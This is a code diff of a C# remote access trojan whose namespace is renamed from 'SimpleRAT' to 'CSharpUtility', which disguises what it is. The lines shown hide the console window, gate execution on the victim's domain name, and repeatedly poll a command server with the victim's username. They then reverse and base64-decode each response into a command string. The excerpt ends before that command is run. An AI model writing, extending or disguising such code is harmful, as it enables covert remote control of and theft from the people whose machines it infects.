@@ -7,7 +7,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
-namespace SimpleRAT
+namespace CSharpUtility
 {
 
     class Program
@@ -42,6 +42,7 @@ namespace SimpleRAT
 
         static void Main(string[] args)
         {
+            string url = args.Length > 1 ? args[0] : "URL";
             byte[] currentMd5 = { };
             ShowWindow(GetConsoleWindow(), 0);
             if (Environment.GetEnvironmentVariable("USERDOMAIN") == "CHANGEME")
@@ -56,7 +57,7 @@ namespace SimpleRAT
 
                 while (true)
                 {
-                    byte[] cmd = client.DownloadData(args[0] + "?" + Environment.GetEnvironmentVariable("USERNAME"));
+                    byte[] cmd = client.DownloadData(url + "?" + Environment.GetEnvironmentVariable("USERNAME"));
                     Array.Reverse(cmd, 0, cmd.Length);
                     string run = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));
 
